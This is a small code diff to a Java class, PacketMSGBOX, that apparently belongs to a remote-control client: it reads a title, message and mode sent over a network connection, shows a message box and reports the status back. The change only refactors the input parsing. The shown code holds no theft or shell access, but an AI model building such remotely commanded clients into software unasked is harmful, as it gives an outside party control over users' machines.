@@ -6,18 +6,20 @@ import javax.swing.UIManager;
 import com.redpois0n.Connection;
 import com.redpois0n.Constants;
 
-
 public class PacketMSGBOX extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
-		boolean theme = Boolean.parseBoolean(Connection.readLine());
+		boolean theme = Connection.readBoolean();
+
 		if (theme) {
 			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 		}
-		final int mode = Integer.parseInt(Connection.readLine());
+
+		final int mode = Connection.readInt();
 		final String title = Connection.readLine();
 		final String message = Connection.readLine();
+
 		new Thread() {
 			public void run() {
 				Connection.status(Constants.STATUS_DISPLAYED_MSGBOX);
